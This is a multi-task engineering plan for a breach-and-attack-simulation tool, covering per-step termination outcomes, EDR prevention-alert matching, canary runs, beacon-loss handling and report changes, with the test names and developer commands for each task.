### Task 6: Beacon reports per-step outcomes, anchor death, and tool presence

**Files:**
- Modify: `agent/beacon/client.go` — `Step` struct (:95-116), `Complete` (:472-485), `executeTask` (:588-740), `executeTaskChained` (:747-865), `runStep` (:1011-1073), `buildSummary` (:1347-1360)
- Create: `agent/beacon/step_outcome.go`
- Test: `agent/beacon/client_test.go`, `agent/beacon/step_outcome_test.go`

**Interfaces:**
- Consumes: Task 5 `ExecResult.Termination/Signal`, `executor.ErrAnchorTerminated`.
- Produces: `Step.RequiredBinaries []string \`json:"required_binaries,omitempty"\``.
- Produces: `type StepOutcome struct { StepID string \`json:"step_id"\`; ExitCode *int \`json:"exit_code"\`; Termination string \`json:"termination"\`; Signal int \`json:"signal,omitempty"\`; Reason string \`json:"reason,omitempty"\` }` and `const` terminations `TermExited="exited"`, `TermSignaled="signaled"`, `TermAnchorTerminated="anchor_terminated"`, `TermTimeout="timeout"`, `TermAborted="aborted"`, `TermNotRun="not_run"`; reasons `ReasonUpstreamSevered="UPSTREAM_SEVERED"`, `ReasonUpstreamNotExecuted="UPSTREAM_NOT_EXECUTED"`, `ReasonToolAbsent="TOOL_ABSENT"`.
- Produces: `Complete(runID string, exitCode int, summary string, steps []StepOutcome) error` posting `{"run_id","exit_code","summary","steps"}`; an empty slice is sent as `[]`.
- Produces: `checkRequiredBinaries(step *Step) (missing []string)` using `exec.LookPath` over `step.RequiredBinaries`. A step that lists no binaries is not checked and nothing is recorded (the server already logged `TOOL_PRESENCE_UNCHECKED` at launch, Task 8). When one is missing: the step is `not_run` / `TOOL_ABSENT`, `!! TOOL_ABSENT: <name>` is written to `/output`, fail-fast stops the task, and the remaining steps are `not_run` / `UPSTREAM_NOT_EXECUTED`.
- Produces, per-step path: a step whose `ExecResult.Termination == "signaled"` records `TermSignaled` with the signal, and fail-fast stops with the remaining steps `not_run` / `UPSTREAM_SEVERED`; the task completes with `exitCode = 128+signal` (so an unupgraded server still sees non-zero).
- Produces, chained path: `errors.Is(execErr, executor.ErrAnchorTerminated)` records `TermAnchorTerminated` for that step (exit code `nil`), **is not** reported as "execution error in step", stops the task with remaining steps `not_run` / `UPSTREAM_SEVERED`, and completes with `exitCode = 137`.
- Produces: `timeout` → `TermTimeout` (exit 124); operator abort → `TermAborted` (exit 130); a normal step → `TermExited` with its exit code.
- Produces: `buildSummary` appends ` | SEVERED at <step_id> (<termination>)` when a step ended in `signaled` or `anchor_terminated`.

- [ ] **Step 1: Write the failing tests** (recording `httptest` server, the pattern of `TestExecuteTask_FailFastStopsAtFirstNonZero`)

```go
func TestComplete_PostsStepOutcomes(t *testing.T)                 // body.steps decodes to the slice given; empty → "[]"
func TestExecuteTask_SignaledStepIsRecordedAndSeversChain(t *testing.T)   // steps: "kill -9 $$", "echo never" → steps[0].termination=="signaled", signal 9; steps[1].termination=="not_run", reason UPSTREAM_SEVERED; exit 137
func TestExecuteTaskChained_AnchorDeathIsAnchorTerminatedNotExecutionError(t *testing.T) // cgo_anchor set; step "kill -9 $$" → steps[0].termination=="anchor_terminated", summary contains "SEVERED at", not "execution error"
func TestExecuteTask_MissingRequiredBinaryIsNotRunToolAbsent(t *testing.T) // required_binaries ["cortexsim-no-such-tool"] → steps[0].termination=="not_run", reason TOOL_ABSENT, output contains "!! TOOL_ABSENT: cortexsim-no-such-tool", step 2 UPSTREAM_NOT_EXECUTED
func TestExecuteTask_OldShapeTaskStillCompletes(t *testing.T)     // task JSON without required_binaries: identical exit code and summary prefix to TestExecuteTask_RunsAllStepsInOrderAndCompletes, steps[] all "exited"
```

- [ ] **Step 2: Run to verify failure**

Run: `cd agent && go test ./beacon/ -run 'StepOutcomes|Signaled|AnchorDeath|ToolAbsent|OldShape' -count=1 -v`
Expected: FAIL (undefined `StepOutcome`, `Complete` arity)

- [ ] **Step 3: Implement** per the Interfaces block. Every existing `c.Complete(id, code, summary)` call site passes the accumulated `[]StepOutcome`.

- [ ] **Step 4: Run the full beacon suite and the cross-compile gate**

Run: `cd agent && go vet ./... && go test ./... -race -count=1 && cd .. && make test-agent-cross`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add agent/beacon/client.go agent/beacon/step_outcome.go agent/beacon/client_test.go agent/beacon/step_outcome_test.go
git commit -m "feat(agent): per-step outcomes, anchor death, and tool presence on /complete"
```

---

### Task 7: `/output` and `/complete` persist step outcomes and apply host evidence

**Files:**
- Modify: `core/api/runs.py:212-220` (`OutputRequest`, `CompleteRequest`), `:51-81` (`_INTEGRITY_MARKERS`), `:865-896` (`append_output`), `:899-1019` (`complete_run`), `:524-540` (scorecard branch)
- Modify: `core/engine/efficacy_scorecard.py` (`build_efficacy_scorecard`, `render_markdown`, `render_html`)
- Create: `core/engine/host_evidence.py`
- Test: `tests/api/test_runs_complete_step_outcomes.py`, `tests/engine/test_host_evidence.py`, extend `tests/api/test_run_report_execution_integrity.py`, `tests/api/test_scorecard_report.py`

**Interfaces:**
- Consumes: Task 1 vocabulary; Task 3 tables; Task 6 wire shape.
- Produces: `class StepOutcomeIn(BaseModel): step_id: str; exit_code: Optional[int] = None; termination: str; signal: Optional[int] = None; reason: Optional[str] = None` with `termination ∈ TERMINATIONS` (422 otherwise); `CompleteRequest.steps: list[StepOutcomeIn] = []`.
- Produces: `append_output` upserts `StepOutcome(run_id, step_id, started_at=utcnow())` when `body.step_id` is set and no row exists (one SQL `INSERT … ON CONFLICT DO NOTHING`, same single-statement discipline as the output append).
- Produces: `host_evidence.severed_step(steps) -> Optional[str]` (first step with termination in `HOST_WITNESS`) and `host_evidence.apply_host_outcomes(results: list[Result], steps) -> int`, where `steps` is any sequence of objects exposing `.step_id`, `.termination`, `.reason` attributes — a `StepOutcomeIn` from `/complete` or a `StepOutcome` ORM row from the sweep (Task 12) — setting `Result.outcome/outcome_reason` from `outcome.host_outcome_for_step` for every Result of a `not_run` step, and for a `prevent` Result on a severed step **in block mode** seeding `outcome="pending"`, `outcome_reason=PREVENTION_UNCONFIRMED_NO_ALERT`, `kpi_verdict="pending"` (the alert may still arrive); returns rows touched.
- Produces: `complete_run` writes one `StepOutcome` per `steps[]` entry (upsert on `(run_id, step_id)`, idempotent on a duplicate `/complete`), sets `Run.severed_at_step`, applies host outcomes, and uses this status rule: `status = "failed"` when `exit_code != 0` **unless** `severed_at_step` is set, the run's `agent_profile_mode == "block"`, and that step carries at least one Result with `expected_outcome == "prevent"` — then `status = "complete"`. All inside the existing single write transaction.
- Produces: `_INTEGRITY_MARKERS` gains `("!! TOOL_ABSENT", …)`, `("!! RUNTIME_DEPENDENCY_MISSING", …)`, `("command not found", …)`, `("BEACON LOST", …)`.
- Produces: `build_efficacy_scorecard(..., integrity: Optional[dict] = None)` and both renderers print the integrity banner first when `integrity["ok"] is False`; the `/report` scorecard branch passes `_execution_integrity(run)`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/engine/test_host_evidence.py
def test_severed_step_is_first_host_witness(): ...
def test_apply_host_outcomes_marks_not_reached_and_not_executed(): ...
def test_prevent_result_on_severed_step_is_pending_awaiting_alert(): ...

# tests/api/test_runs_complete_step_outcomes.py
async def test_complete_without_steps_is_byte_identical(...):        # old beacon: status failed on non-zero, no step_outcomes rows
async def test_complete_persists_step_outcomes_and_severs(...):      # block run, step-02 anchor_terminated, step-03 not_run UPSTREAM_SEVERED → run.status "complete", severed_at_step "step-02", step-03 Results outcome not_reached
async def test_complete_non_prevent_signaled_step_still_fails_run(...): # report-mode run, signaled step → status failed (no prevent expectation)
async def test_duplicate_complete_does_not_duplicate_step_outcomes(...):
async def test_complete_rejects_unknown_termination(...):            # termination "exploded" → 422
async def test_output_with_step_id_records_started_at(...):
```

Extend `test_run_report_execution_integrity.py`: output containing `!! TOOL_ABSENT: hydra` renders the READ THIS FIRST section. Extend `test_scorecard_report.py`: the same run's `?format=scorecard` output starts with the integrity banner.

- [ ] **Step 2: Run to verify failure, implement, run to verify pass**

Run: `.venv/bin/pytest tests/engine/test_host_evidence.py tests/api/test_runs_complete_step_outcomes.py tests/api/test_run_report_execution_integrity.py tests/api/test_scorecard_report.py tests/api/test_runs_complete_terminal.py tests/api/test_runs_multi_endpoint_control.py -v`
Expected: PASS (the last two prove the terminal guard and fan-out are unchanged)

- [ ] **Step 3: Commit**

```bash
git add core/api/runs.py core/engine/host_evidence.py core/engine/efficacy_scorecard.py \
  tests/engine/test_host_evidence.py tests/api/test_runs_complete_step_outcomes.py \
  tests/api/test_run_report_execution_integrity.py tests/api/test_scorecard_report.py
git commit -m "feat(api): persist step outcomes, sever the run, apply host evidence"
```

---

### Task 8: Orchestrator projects required binaries and surfaces the egress warning

**Files:**
- Modify: `core/engine/orchestrator.py:1453-1498` (`_resolve_adapter_placeholders`), `:635-645` and `:710-720` (Task build), `:1152-1178` (`_compose_artifacts`)
- Modify: `core/engine/payload_shelf.py:845-855` (`TARGET_EGRESS_REQUIRED` text)
- Test: `tests/engine/test_orchestrator_required_binaries.py`, extend `tests/engine/test_payload_shelf*.py` (the test that asserts the warning text)

**Interfaces:**
- Consumes: pack `install.binary` (`tools/packs/_schema.yml:102`), present on 77 of 92 packs.
- Produces: `_resolve_adapter_placeholders` returns, alongside the rendered steps, a `dict[step_id, list[str]]` of the `install.binary` values of every pack whose placeholder it substituted into that step (deduplicated, ordered); the Task build writes each list onto the step dict as `required_binaries` (omitted when empty, like `platforms`).
- Produces: a pack with no `install.binary` contributes nothing and the orchestrator logs one WARNING `TOOL_PRESENCE_UNCHECKED adapter=<id> step=<id>`.
- Produces: the `TARGET_EGRESS_REQUIRED` warning text says *"pull mode does not install tier-4 tools; the target must already carry <binary> on PATH"*, is logged at WARNING, and is appended to `Run.output` as `!! TARGET_EGRESS_REQUIRED: <adapter_id> — <text>` at launch (before enqueue).

- [ ] **Step 1: Write the failing tests**

```python
def test_required_binaries_follow_adapter_placeholders(...):   # scenario with external_tools[adapter_ref=TOOL-NMAP] used in step-02 only → task.steps[1]["required_binaries"] == ["nmap"], step-01 has no key
def test_pack_without_binary_is_unchecked_and_warned(caplog, ...):
def test_egress_warning_reaches_run_output(...):              # run.output contains "!! TARGET_EGRESS_REQUIRED"
```

- [ ] **Step 2: Run to verify failure, implement, run to verify pass**

Run: `.venv/bin/pytest tests/engine/test_orchestrator_required_binaries.py tests/engine -k "payload_shelf or orchestrator" -v`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add core/engine/orchestrator.py core/engine/payload_shelf.py tests/engine/test_orchestrator_required_binaries.py tests/engine/test_payload_shelf*.py
git commit -m "feat(engine): project required binaries onto tasks; surface egress warning on the run"
```

---

### Task 9: The connector reads `action`; the matcher learns the `prevention` family

**Files:**
- Modify: `core/connectors/base.py:42-126` (`ObservedAlert`, `from_dict`), `core/connectors/xsiam.py:371-406` (`_normalize_alert`), `core/connectors/preflight.py:76-84` (`ALERT_SHAPE_KEYS`), `core/connectors/matcher.py:35-66` (`_FAMILIES`, `signal_family`), `:147-170` (`MatchVerdict`), `:314-398` (`reconcile`)
- Test: `tests/connectors/test_alert_outcome.py`, `tests/connectors/test_matcher_prevention_family.py`, extend `tests/connectors/test_preflight_alert_shape.py`, `tests/connectors/test_matcher_source_and_host.py`

**Interfaces:**
- Consumes: Task 1 `classify_alert_outcome`.
- Produces: `ObservedAlert.action: Optional[str]`, `ObservedAlert.action_pretty: Optional[str]`, `ObservedAlert.outcome: str` (set by `__post_init__` via `classify_alert_outcome`); both `from_dict` and `_normalize_alert` read `action` / `action_pretty`; `to_dict` includes all three.
- Produces: `ALERT_SHAPE_KEYS["action"] = ("action_pretty", "action")` — the reconcile preflight's `alert_shape` stage now reports whether the tenant's alerts carry an action (this is the executable form of spec §9's 3.x verification item).
- Produces: `_FAMILIES` gains `"prevention"`; `signal_family` returns `"prevention"` for `"xdr agent"` in the source or an exact `"prevention"` type, checked **before** the `bioc`/`analytics` substring rules.
- Produces: `MatchVerdict.alert_action: Optional[str]`, `MatchVerdict.alert_outcome: Optional[str]` (in `to_dict`), filled in `reconcile`.
- Produces: `reconcile(..., window_seconds_by_type: Optional[dict[str, int]] = None)` — a per-`signal_type` override of the window; absent types use `window_seconds`.

- [ ] **Step 1: Write the failing tests**

```python
# tests/connectors/test_alert_outcome.py
def test_observed_alert_classifies_outcome_from_action_pretty(): ...   # "Prevented (Blocked)" → "prevented"; absent → "unknown"
def test_xsiam_normalize_reads_action_fields(): ...                    # via the connector's _normalize_alert on a dict with action/action_pretty
# tests/connectors/test_matcher_prevention_family.py
def test_xdr_agent_source_is_prevention_family(): assert signal_family("XDR Agent") == "prevention"; assert signal_family("Prevention") == "prevention"
def test_prevention_alert_cannot_credit_bioc_expectation(): ...        # Result signal_type BIOC + alert source "XDR Agent" same technique → no match
def test_bioc_alert_cannot_credit_prevention_expectation(): ...
def test_prevention_expectation_matches_agent_alert_and_carries_action(): ...   # verdict.alert_outcome == "prevented"
def test_per_type_window_widens_analytics_only(): ...                  # Analytics result matches an alert at +5000 s when window_seconds_by_type={"Analytics": 7200}; a BIOC at +5000 s does not
```

- [ ] **Step 2: Run to verify failure, implement, run the whole connectors suite**

Run: `.venv/bin/pytest tests/connectors -q`
Expected: all pass

- [ ] **Step 3: Commit**

```bash
git add core/connectors/base.py core/connectors/xsiam.py core/connectors/preflight.py core/connectors/matcher.py \
  tests/connectors/test_alert_outcome.py tests/connectors/test_matcher_prevention_family.py \
  tests/connectors/test_preflight_alert_shape.py tests/connectors/test_matcher_source_and_host.py
git commit -m "feat(connectors): read alert action; prevention matcher family; per-type window"
```

---

### Task 10: Verdicts with two witnesses, soak-aware pending, honest denominators

**Files:**
- Modify: `core/connectors/service.py:98-125` (window), `:210-273` (`apply_verdicts`), `:276-292` (`efficacy_summary`), `:1060-1095` (the sweep's window)
- Modify: `core/connectors/measures.py:63-72` (`detection_accuracy`)
- Modify: `core/config.py:64` (add `CORTEXSIM_RECONCILE_WINDOW_ANALYTICS: int`)
- Modify: `core/api/connectors.py` (`/reconcile` and `/observations` pass the per-type window)
- Test: `tests/connectors/test_measurement_service.py` (extend), `tests/connectors/test_soak_pending.py`, `tests/connectors/test_measures.py` (extend)

**Interfaces:**
- Consumes: Task 1 `evaluate_prevent`, `soak_pending_reason`, `EXCLUDED_FROM_DENOMINATOR`; Task 3 `Observation`, `StepOutcome`; Task 9 verdict fields.
- Produces: `CORTEXSIM_RECONCILE_WINDOW_ANALYTICS: int` — the builder pins the default from the Cortex XDR Analytics Alert Reference Guide's typical test period and cites the page in the setting's comment; tests monkeypatch it.
- Produces: `service.window_by_type() -> dict[str, int]` → `{"Analytics": settings.CORTEXSIM_RECONCILE_WINDOW_ANALYTICS, "ABIOC": same}`; every `reconcile(...)` call in `service.py` passes it.
- Produces: `apply_verdicts(...)` for each matched verdict sets `result.alert_action`, `result.alert_outcome`, inserts an `Observation` row (the matched alert's normalised fields + `raw`), and sets `result.outcome`: for `expected_outcome == "prevent"` via `evaluate_prevent(agent_profile_mode=run.agent_profile_mode, alert_outcome=v.alert_outcome, termination=<StepOutcome.termination for result.step_id>, window_closed=False, block_mode_status=run.block_mode_status)` writing `outcome`, `outcome_reason`, `kpi_verdict`; for `detect` → `outcome="detected"` (a `prevented` alert on a `detect` expectation of the `prevention` family is still `detected`).
- Produces: after the matched loop, for every still-unobserved Result with `executed_at + window(signal_type) < now`: if `expected_outcome == "prevent"` → `evaluate_prevent(..., alert_outcome=None, window_closed=True)`; else `reason = soak_pending_reason(signal_type=…, soakless_attested=run.soakless_attested, first_run_observed=<the paired first run observed the same detection_id>)` → when a reason exists set `outcome="pending"`, `outcome_reason=reason`; otherwise leave the row for the existing missed/pending rendering. Results already `not_reached` / `not_executed` are skipped.
- Produces: `efficacy_summary` and `measures.detection_accuracy` exclude Results whose `outcome ∈ EXCLUDED_FROM_DENOMINATOR` or whose `outcome_reason ∈ {ANALYTICS_ACTIVATION_PERIOD, DEDUP_WINDOW}` from both numerator and denominator, and report the excluded count as `excluded: {"not_reached": n, "not_executed": n, "soak_pending": n}`.

- [ ] **Step 1: Write the failing tests** (the `tests/connectors/conftest.py` fixtures; a run with `agent_profile_mode="block"`, a `StepOutcome(step-02, anchor_terminated)`, a `prevent` Result on step-02)

```python
async def test_prevented_alert_plus_anchor_death_scores_pass(...):          # result.outcome "prevented", kpi_verdict "pass", Observation row with raw
async def test_prevented_alert_on_exited_step_is_pending_with_reason(...):
async def test_report_mode_prevented_alert_is_detected_and_contradicted(...):  # Review Focus 3
async def test_silent_analytics_without_soakless_is_pending_not_missed(...):   # window closed → outcome pending, reason ANALYTICS_ACTIVATION_PERIOD; detection_accuracy excludes it
async def test_second_run_silence_is_dedup_window(...):                        # paired first run observed the detection_id
async def test_not_reached_rows_leave_the_denominator(...):                   # efficacy_summary.coverage_pct computed over the rest; excluded counts present
```

- [ ] **Step 2: Run to verify failure, implement, run the connectors and measures suites**

Run: `.venv/bin/pytest tests/connectors tests/api/test_connectors_api.py tests/api/test_auto_reconcile.py -q`
Expected: all pass

- [ ] **Step 3: Commit**

```bash
git add core/connectors/service.py core/connectors/measures.py core/config.py core/api/connectors.py \
  tests/connectors/test_measurement_service.py tests/connectors/test_soak_pending.py tests/connectors/test_measures.py
git commit -m "feat(connectors): two-witness prevention verdicts, soak-aware pending, honest denominators"
```

---

### Task 11: The canary run

**Files:**
- Modify: `core/config.py` (`CORTEXSIM_CANARY_SCENARIO_LINUX: str = ""`), `core/api/runs.py` (new `POST /canary`; `canary_run_id` validation in the launch path), `core/engine/orchestrator.py` (`launch` derives `block_mode_status`)
- Create: `core/engine/canary.py`
- Test: `tests/api/test_runs_canary.py`, `tests/engine/test_canary.py`

**Interfaces:**
- Consumes: Task 4 launch fields; Task 1 `BLOCK_MODE_*` statuses.
- Produces: `canary.canary_scenario_id(platform: str) -> Optional[str]` (reads the config; `""` → `None`).
- Produces: `canary.block_mode_status_from(canary_run: Optional[Run], canary_results: list[Result]) -> str` → `"block_mode_confirmed"` when any Result has `outcome == "prevented"`; `"block_mode_unconfirmed"` when the run is terminal and none does; `"canary_not_available"` when `canary_run is None`.
- Produces: `POST /api/runs/canary {target_agent_id}` → launches `canary_scenario_id("linux")` in pull mode with `agent_profile_mode="block"` and returns `{"run_id", "scenario_id"}`; 409 `CANARY_NOT_AVAILABLE` when unconfigured.
- Produces: a launch with `canary_run_id` validates (exists, `scenario_id == canary_scenario_id`, same target, terminal) → else 409 `CANARY_INVALID`; `Run.block_mode_status` is derived at launch; a block-mode launch **without** `canary_run_id` leaves `block_mode_status` `None`.
- Builder note: the canary scenario YAML itself (a documented benign PANW trigger, spec §5.2 constraint) is **not** authored here; the mechanism ships with the config empty and `canary_not_available` as the honest default.

- [ ] **Step 1: Write the failing tests**

```python
def test_block_mode_status_derivation(): ...                         # three branches
async def test_canary_endpoint_409_when_unconfigured(...):
async def test_canary_endpoint_launches_configured_scenario(monkeypatch, ...):
async def test_launch_with_canary_derives_status_and_rejects_bad_link(...):   # confirmed / unconfirmed / CANARY_INVALID on wrong target
```

- [ ] **Step 2: Run to verify failure, implement, run to verify pass**

Run: `.venv/bin/pytest tests/engine/test_canary.py tests/api/test_runs_canary.py tests/api/test_runs_launch_context.py -v`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add core/config.py core/api/runs.py core/engine/orchestrator.py core/engine/canary.py tests/engine/test_canary.py tests/api/test_runs_canary.py
git commit -m "feat(api): canary run links a block-mode launch to proof of the profile"
```

---

### Task 12: A run whose beacon dies

**Files:**
- Create: `core/engine/beacon_lost.py`
- Modify: `core/api/agents.py:1537-1569` (`sweep_agents_once`), `core/config.py` (`CORTEXSIM_BEACON_LOST_AFTER_SECONDS: int = 180`)
- Test: `tests/engine/test_beacon_lost.py`, extend `tests/api/test_agents_heartbeat.py`

**Interfaces:**
- Consumes: Task 3 `StepOutcome`; Task 7 `host_evidence.apply_host_outcomes`; Task 1 `TERMINATION_BEACON_LOST`, `UPSTREAM_SEVERED`.
- Produces: `beacon_lost.terminalise_lost_runs(db: AsyncSession, agent_id: str, now: datetime, *, after_seconds: int) -> list[str]` — for each `Run` with `status == "running"`, `target == agent_id`, `delivered_at` set, and `now - <latest StepOutcome.started_at or delivered_at> >= after_seconds`: pick `severed = <step with the latest started_at> or <first step id>`; upsert `StepOutcome(severed, termination="beacon_lost")`; every later step `StepOutcome(..., termination="not_run", reason=UPSTREAM_SEVERED)`; `apply_host_outcomes`; set `status="complete"`, `completed_at=now`, `severed_at_step=severed`; append `"\n--- BEACON LOST — agent went offline mid-run; enable BAS mode so only the simulation is terminated ---\n"` to `output`; publish `run.status`; call `score_run_safely(db, run, source="beacon_lost")`. Returns the run ids terminalised.
- Produces: `sweep_agents_once` calls it for every agent whose derived status is `offline` (not only on transition, so a restart cannot skip one).

- [ ] **Step 1: Write the failing tests**

```python
async def test_offline_agent_terminalises_running_run_as_beacon_lost(...):   # step-02 started_at 10 min ago → severed_at_step step-02, termination beacon_lost, step-03 not_reached, status complete, output marker
async def test_recently_reconnected_agent_is_left_alone(...):                 # Review Focus 5: last started_at 30 s ago, after_seconds=180 → []
async def test_prevent_result_caps_at_pending_beacon_lost(...):               # prevent Result on step-02 → kpi_verdict pending, reason PREVENTION_UNCONFIRMED_BEACON_LOST (after a reconcile with a Prevented alert)
async def test_sweep_invokes_terminalisation_for_offline_agents(...):         # extend test_agents_heartbeat.py
```

- [ ] **Step 2: Run to verify failure, implement, run to verify pass**

Run: `.venv/bin/pytest tests/engine/test_beacon_lost.py tests/api/test_agents_heartbeat.py tests/api/test_restart_inflight_run.py -v`
Expected: PASS (`rehydrate` behaviour unchanged)

- [ ] **Step 3: Commit**

```bash
git add core/engine/beacon_lost.py core/api/agents.py core/config.py tests/engine/test_beacon_lost.py tests/api/test_agents_heartbeat.py
git commit -m "feat(engine): terminalise a run whose beacon died, resolving pending"
```

---

### Task 13: Graph and storyline carry the new states; provenance is fixed

**Files:**
- Modify: `core/engine/detection_storyline.py:42-44`, `:135-150` (`_entry_status`), the entry dict builder
- Modify: `core/engine/causality_graph.py:98-100` (states), `:243-254` (`_control_layer`), `:461-477` (step rollup), `:594-628` (alert node, sequence edges), `:954-1003` (dual-control)
- Modify: `core/api/causality.py:216-221`, `core/api/storyline.py` (pass `observations`)
- Test: `tests/engine/test_detection_storyline*.py` (extend), `tests/engine/test_causality_graph_severed.py`, `tests/api/test_causality_api.py`, `tests/api/test_storyline_api.py` (extend)

**Interfaces:**
- Produces: storyline statuses `STATUS_PREVENTED="prevented"`, `STATUS_NOT_REACHED="not_reached"`, `STATUS_NOT_EXECUTED="not_executed"`; `_entry_status(result, run_status)` returns `result["outcome"]` when it is one of those three or when `outcome == "pending"` with an `outcome_reason` (even on a terminal run); otherwise today's rules. Entries gain `outcome_reason`, `prevention_module`, `alert_action`, `alert_outcome`.
- Produces: `STATE_SEVERED="SEVERED"`; the `sequence` and `process_lineage` edges out of `run["severed_at_step"]` are `SEVERED`; step/process nodes of steps whose every Result is `not_reached` carry `"status": "not_reached"`; the alert node carries `outcome`, `outcome_reason`, `prevention_module`; `summary["severed_at_step"]`.
- Produces: `_control_layer` returns `"exposure" | "runtime_control"`; `by_control_layer` and `_dual_control_verdict` use the new key; the verdict strings are unchanged in meaning.
- Produces: `GET /api/runs/{id}/causality` and the storyline endpoint load `Observation` rows for the run and pass `observations={result_id: observation.to_dict()}` so a reconcile-matched detection carries `alert_id` and the UI counts it machine-verified.

- [ ] **Step 1: Write the failing tests**

```python
def test_entry_status_prefers_outcome_states(): ...                    # prevented / not_reached / not_executed / pending-with-reason on a terminal run
def test_severed_sequence_edge_and_not_reached_nodes(): ...            # run severed_at_step="step-02", step-03 Results not_reached → edge step-02→step-03 SEVERED, node status not_reached, summary.severed_at_step
def test_control_layer_renamed_runtime_control(): ...
async def test_causality_api_passes_observations_so_reconcile_is_machine_verified(...):   # alert node observed_at + external id present
```

- [ ] **Step 2: Run to verify failure, implement, run the engine and api graph/storyline suites**

Run: `.venv/bin/pytest tests/engine -k "storyline or causality" tests/api/test_causality_api.py tests/api/test_storyline_api.py tests/api/test_storyline_integration.py -v`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add core/engine/detection_storyline.py core/engine/causality_graph.py core/api/causality.py core/api/storyline.py \
  tests/engine/test_causality_graph_severed.py tests/engine/test_detection_storyline*.py tests/api/test_causality_api.py tests/api/test_storyline_api.py
git commit -m "feat(engine): severed chain, not_reached and prevented in graph and storyline"
```

---

### Task 14: The report: outcomes, chain integrity, prevention delta, attestations

**Files:**
- Modify: `core/api/runs.py:492-751` (`get_report`), `core/engine/report_generator.py:80-87` (`_status_from_result`), `_VERDICT_LABEL` neighbourhood
- Test: `tests/api/test_run_report_prevention.py`

**Interfaces:**
- Consumes: Task 4 `build_pair_delta`; Task 10 excluded counts; Task 7 `severed_at_step`.
- Produces, markdown sections in this order after `## Detection Coverage Summary`: `## Chain Integrity` (when `severed_at_step` or any `not_reached` / `not_executed`), `## Prevention Delta (report → block)` (when the run is paired; one table row per detection from `build_pair_delta`), then the existing verdict and MTTD sections, and `## Attestations` before `## Detailed Detection Results` whenever `agent_profile_mode != "unknown"` or any attestation field is set.
- Produces: coverage summary headline becomes `**Overall: {observed}/{denominator} detections confirmed ({pct}%) — {prevented} prevented · {excluded} excluded (not reached / not executed / soak-pending)**`; the `by_type` table gains a `Prevented` column.
- Produces: per-result icon by `outcome`: `prevented` 🛡, `detected` ✅, `missed` ❌, `pending` ⏳ `(reason)`, `not_reached` ⏭, `not_executed` ⚠; `report_generator._status_from_result` maps `prevented` → `"PREVENTED"`, `not_reached`/`not_executed` → `"NOT_RUN"`.
- Produces: Attestations lines: `agent profile mode: block — attested by henry at 2026-10-26T15:02Z, not verified` / `BAS mode: enabled — attested` / `soakless: enabled — attested` / `canary: block_mode_confirmed (run …)` or `canary: not run`.

- [ ] **Step 1: Write the failing tests** (one seeded pair: report run with two detected Results; block run severed at step-02 with a `prevented` Result, a `not_reached` Result, and a soak-pending Analytics Result)

```python
async def test_report_chain_integrity_and_icons(...):          # "## Chain Integrity", "severed at step-02 of 3", "🛡", "⏭", "⏳ (ANALYTICS_ACTIVATION_PERIOD)"
async def test_report_prevention_delta_table(...):            # "## Prevention Delta" with the row "step-02 | … | detected | prevented"
async def test_report_attestations_section(...):              # "not verified" appears for the profile line
async def test_unpaired_unattested_run_report_is_byte_identical(...):   # seeded_run from test_runs_api: no new sections, same headline shape
```

- [ ] **Step 2: Run to verify failure, implement, run the report suites**

Run: `.venv/bin/pytest tests/api/test_run_report_prevention.py tests/api/test_runs_api.py tests/api/test_run_report_execution_integrity.py tests/engine -k report -v`
Expected: PASS

- [ ] **Step 3: Commit**

```bash
git add core/api/runs.py core/engine/report_generator.py tests/api/test_run_report_prevention.py
git commit -m "feat(report): outcome icons, chain integrity, prevention delta, attestations"
```

---

### Task 15: Console: launch context, outcome rendering, attested rungs

**Files:**
- Modify: the launch form component (grep `allow_runtime_install` under `ui/src/components/` to find it), `ui/src/api/storyline.js:20-50`, `ui/src/components/DetectionStoryline.jsx`, `ui/src/components/CausalityGraph.jsx`, `ui/src/components/console/RunDetailView.jsx`, `ui/src/components/console/ReadinessView.jsx`, `ui/src/components/console/MultiRunCompare.jsx`
- Test: the sibling `*.test.jsx` of each (vitest)

**Interfaces:**
- Consumes: Task 4 launch fields and `/pair`; Task 13 statuses; Task 11 `POST /api/runs/canary`.
- Produces: the launch form sends `agent_profile_mode` (select: report / block / unknown), `bas_mode_attested`, `soakless_attested` (tri-state), `attested_by`, `paired_with_run_id` (picker over terminal runs of the same scenario and target), and a "Run canary first" button that calls `/canary` and fills `canary_run_id`.
- Produces: `normalizeStoryline` maps `prevented`, `not_reached`, `not_executed` and carries `outcome_reason`; the storyline and graph render the five icons from Task 14 and a `SEVERED` edge style; `RunDetailView` shows an **Attestations** panel with the "attested, not verified" wording per line.
- Produces: `ReadinessView` gains a rung group **Attested-only facts** listing agent profile mode, BAS mode, soakless, each with the line *what would verify it* (canary / nothing / nothing); values come from the most recent run's attestations.
- Produces: `MultiRunCompare` reads `/pair` when the selected runs are a pair and shows the delta table.

- [ ] **Step 1: Write the failing vitest tests** — one per component: form posts the new fields; `normalizeStoryline` keeps `outcome_reason` and counts `prevented` as machine-verified when an alert id is present; graph renders a severed edge class; readiness renders the three rungs with "not verified".

- [ ] **Step 2: Run to verify failure, implement, run the UI suite and build**

Run: `cd ui && npx vitest run && npm run build`
Expected: all pass; build succeeds

- [ ] **Step 3: Commit**

```bash
git add ui/src   # stage the touched files by name
git commit -m "feat(ui): attested launch context, outcome rendering, severed graph, readiness rungs"
```

---

### Task 16: Tier-D end-to-end: three host witnesses

**Files:**
- Modify: `deploy/tier-d/run-tier-d.sh` (new `--inject-kill subshell|anchor|beacon --at-step <id>`), `deploy/tier-d/classify.py:147-167` (`classify_step` reads `termination`), `deploy/tier-d/tier_c_assert.py` or the verdict builder (`build_verdict` includes `terminations`)
- Create: `tests/e2e_isolated/test_tier_d_prevention_witnesses.py`, `tests/fixtures/scenarios/sim-test-prev-001.yml` (from Task 2) registered for the harness
- Test: the new test module (opt-in, skips without docker + SimCore like `test_tier_d_agent_path.py:275-283`)

**Interfaces:**
- Consumes: Tasks 6, 7, 12.
- Produces: `--inject-kill` starts a sidecar in the target container that, once `/output` for `--at-step` arrives, sends `SIGKILL` to the step's subshell, the anchor shell, or the beacon process respectively (the harness already knows the beacon pid; the anchor is the beacon's child `sh`; the subshell is the anchor's child).
- Produces: `verdict.json` carries `terminations: {step_id: {termination, reason}}`, `severed_at_step`, `run_status`.
